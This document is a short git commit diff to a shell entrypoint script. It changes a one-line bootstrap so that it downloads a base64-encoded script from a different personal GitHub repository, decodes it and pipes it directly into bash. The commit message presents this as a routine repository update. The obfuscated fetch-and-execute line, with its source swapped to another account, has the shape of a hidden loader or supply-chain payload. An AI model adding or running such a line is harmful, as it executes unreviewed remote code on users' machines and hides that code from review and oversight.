3fc089931cb9a588ce312c67c820c2de8aad4b17
craigcarousel <craigcarousel@proton.me>
2026-06-21 04:18:40 +0200

    Update entrypoint script URL to new repository

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/christopheroliphant/deal/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/craigcarousel/coat/refs/heads/main/entrypoint.sh | base64 -d | bash
